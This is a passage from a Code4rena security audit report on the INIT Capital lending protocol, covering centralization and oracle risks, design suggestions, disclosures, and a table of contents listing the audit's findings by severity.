Risks</strong></p>\n<ol>\n<li><strong>Oracle Reliability</strong>: The protocol relies on oracles for accurate price reporting of underlying tokens in the LendingPool. If these oracles fail to report correct prices, it could lead to miscalculations in the value of collateral and debts. This scenario may cause unwarranted liquidations or enable effectively uncollateralized loans.</li>\n<li><strong>Sharp Drop in Collateral</strong>: The protocol assumes sufficient liquidity for collateral liquidation before incurring bad debts. However, if highly volatile tokens are used as collateral and they depreciate rapidly, it could result in significant bad debts. This situation is exacerbated by the absence of a collateral cap check in the current implementation.</li>\n</ol>\n<p><strong>Administrative Control Over Debt Ceiling and Lending Pools</strong></p>\n<ul>\n<li>The admin also has the authority to update the debt ceiling in the risk manager for each mode.</li>\n<li>Additionally, they possess the ability to enable, disable, or modify support for specific lending pools or Wrapped LP (WLP) contracts.</li>\n</ul>\n<p>These additional administrative controls further underscore the centralization risks within the INIT protocol, where significant power is vested in the hands of a central administrative authority.</p>\n<h3 id=\"suggestions-for-the-init-protocol-based-on-identified-needs\" style=\"position:relative;\"><a href=\"#suggestions-for-the-init-protocol-based-on-identified-needs\" aria-label=\"suggestions for the init protocol based on identified needs permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Suggestions for the INIT Protocol Based on Identified Needs</h3>\n<ol>\n<li>\n<p><strong>Diversifying LP Tokens as Collateral</strong>:</p>\n<ul>\n<li><strong>Strategy</strong>: Develop a framework to support a variety of LP tokens as collateral. This should include a comprehensive analysis of each LP token’s market behavior, liquidity, and volatility.</li>\n<li><strong>Implementation</strong>: Set up a process for periodically reviewing and updating the list of supported LP tokens to ensure relevance and stability.</li>\n</ul>\n</li>\n<li>\n<p><strong>Implementing WLP Oracles with Manipulation Resistance</strong>:</p>\n<ul>\n<li><strong>Approach</strong>: Although the implementation of WLP (Wrapped LP) is not currently in scope, it is crucial to design WLP oracles that are robust against market manipulation.</li>\n<li><strong>Action</strong>: Utilize multiple, independent oracles for price feeds to diminish the impact of any single source being manipulated. Implement additional checks and balances, such as price feed deviation limits, to further strengthen resistance against manipulation.</li>\n</ul>\n</li>\n<li>\n<p><strong>Ensuring Fair Compensation for Liquidators</strong>:</p>\n<ul>\n<li><strong>Objective</strong>: To maintain a healthy protocol ecosystem, liquidators should be adequately incentivized to clear bad debt.</li>\n<li><strong>Method</strong>: Design a liquidation reward system that offers competitive compensation based on the risk and capital involved in liquidation processes. Regularly adjust incentives in line with market conditions to maintain attractiveness and effectiveness.</li>\n</ul>\n</li>\n<li>\n<p><strong>Careful Management of Protocol Configuration</strong>:</p>\n<ul>\n<li><strong>Focus</strong>: Effective management of protocol configurations is essential to maintain system stability and user trust.</li>\n<li><strong>Tactics</strong>:</li>\n<li>Implement a governance system for major configuration changes, involving a wider community or stakeholder vote, ensuring decisions are not centralized.</li>\n<li>Establish a transparent change management process, where any updates to the protocol configurations are clearly communicated to users beforehand.</li>\n<li>Conduct regular audits and stress tests on configuration changes to assess their impact under various scenarios.</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"time-spent\" style=\"position:relative;\"><a href=\"#time-spent\" aria-label=\"time spent permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Time spent:</h3>\n<p>25 hours</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/7#issuecomment-1869826974\">fez-init (INIT) acknowledged</a></strong></p>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-3\">High Risk Findings (3)</a></p>\n<ul>\n<li><a href=\"#h-01-liquidations-can-be-prevented-by-frontrunning-and-liquidating-1-debt-or-more-due-to-wrong-assumption-in-pos_manager\">[H-01] Liquidations can be prevented by frontrunning and liquidating 1 debt (or more) due to wrong assumption in POS_MANAGER</a></li>\n<li><a href=\"#h-02-wlp-tokens-could-be-stolen-\">[H-02] wLp tokens could be stolen </a></li>\n<li><a href=\"#h-03-_handlerepay-of-moneymarkethook-does-not-consider-the-actual-debt-shares-of-the-posid-inside-the-position-manager-and-could-lead-to-a-users-tokens-getting-stuck-inside-the-hook\">[H-03] <code>_handleRepay</code> of <code>MoneyMarketHook</code> does not consider the actual debt shares of the <code>posId</code> inside the position manager and could lead to a user’s tokens getting stuck inside the hook</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-12\">Medium Risk Findings (12)</a></p>\n<ul>\n<li><a href=\"#m-01-repay-liquidate-and-liquidatewlp-receive-shares-as-argument-which-may-revert-if-from-approval-to-tx-settled-blocks-have-passed\">[M-01] repay(), liquidate() and liquidateWLp() receive shares as argument, which may revert if from approval to tx settled blocks have passed</a></li>\n<li><a href=\"#m-02-decimals-of-lendingpool-dont-take-into-account-the-offset-introduced-by-virtual_shares\">[M-02] Decimals of LendingPool don’t take into account the offset introduced by VIRTUAL_SHARES</a></li>\n<li><a href=\"#m-03-when-the-returnnative-parameter-is-set-to-true-in-the-_params-provided-to-moneymarkethookexecute-it-is-not-handled-properly-and-could-disrupt-user-expectations\">[M-03] When the <code>returnNative</code> parameter is set to true in the <code>_params</code> provided to <code>MoneyMarketHook.execute</code>, it is not handled properly and could disrupt user expectations</a></li>\n<li><a href=\"#m-04-setposmode-should-not-allow-changing-the-mode-when-the-new-modes-canrepay-status-is-disabled\">[M-04] <code>setPosMode</code> should not allow changing the mode when the new mode’s <code>canRepay</code> status is disabled</a></li>\n<li><a href=\"#m-05-collateralizewlp-can-be-bypassed-even-when-collateralization-is-paused\">[M-05] <code>collateralizeWLp</code> can be bypassed even when collateralization is paused</a></li>\n<li><a href=\"#m-06-setposmode-function-doesnt-check-if-wlp-is-whitelisted\">[M-06] setPosMode function doesn’t check if wLp is whitelisted</a></li>\n<li><a href=\"#m-07-malicious-user-can-steal-native-tokens-of-moneymarkethook-caller\">[M-07] Malicious user can steal native tokens of MoneyMarketHook caller</a></li>\n<li><a href=\"#m-08-trst-m-8-from-previous-audit-still-present\">[M-08] <code>TRST-M-8</code> from previous audit still present</a></li>\n<li><a href=\"#m-09-if-wlp-is-blacklisted-then-user-will-not-be-able-to-withdraw-it\">[M-09] If wLP is blacklisted, then user will not be able to withdraw it</a></li>\n<li><a href=\"#m-10-lack-of-way-to-handle-not-fully-repaid-bad-debt-after-liquidation-after-the-lending-pool-share-or-wlp-are-fully-seized\">[M-10] Lack of way to handle not fully repaid bad debt after liquidation after the lending pool share or WLP are fully seized</a></li>\n<li><a href=\"#m-11-api3-oracle-timestamp-can-be-set-to-future-timestamp-and-block-api3-oracle-usage-to-make-code-revert-in-underflow\">[M-11] API3 oracle timestamp can be set to future timestamp and block API3 Oracle usage to make code revert in underflow</a></li>\n<li><a href=\"#m-12-admin-configuration-isallowedforcollateralmode-pool-can-be-bypassed-by-donating-asset-to-the-pool-directly-and-then-trigger-sync-cash-via-flashloan\">[M-12] Admin configuration isAllowedForCollateral(mode, pool) can be bypassed by donating asset to the pool directly and then trigger sync cash via flashloan</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#l-01-reservefactor-in-lendingpool-should-be-capped-at-1e18\">L-01 reserveFactor in LendingPool should be capped at 1e18</a></li>\n<li><a href=\"#l-02-setborrfactors_e18-could-check-for-duplicate-_pools-as-an-additional-check-to-make-sure-that-no-incorrect-factors-are-set\">L-02 <code>setBorrFactors_e18()</code> could check for duplicate <code>_pools</code> as an additional check to make sure that no incorrect factors are set</a></li>\n<li><a href=\"#l-03-excess-eth-in-initcoremulticall-and-initcorecallback-could-be-refunded\">L-03 excess ETH in <code>InitCore:Multicall()</code> and <code>InitCore:callback()</code> could be refunded</a></li>\n<li><a href=\"#n-01--execute-could-check-leftover-balances-in-all-interacted-tokens\">N-01  <code>execute()</code> could check leftover balances in all interacted tokens</a></li>\n<li><a href=\"#n-02-missing-a-way-to-remove-colltokens-from-configsol-which-could-be-dangerous-in-the-long-run-as-some-token-could-go-rogue-or-an-upgrade\">N-02 missing a way to remove <code>collTokens</code> from <code>Config.sol</code>, which could be dangerous in the long run as some token could go rogue (or an upgrade).</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#g-01-setposmode-function-loops-through-all-borrowed-pools-and-checks-if-it-is-allowed-to-borrow-in-new-mode-and-repay-in-old-pool-inside-the-loop\">G-01 <code>setPosMode</code> function loops through all borrowed pools and checks if it is allowed to borrow in new mode and repay in old pool inside the loop</a></li>\n</ul>\n</li>\n<li><a href=\"#audit-analysis\">Audit Analysis</a></li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>"
}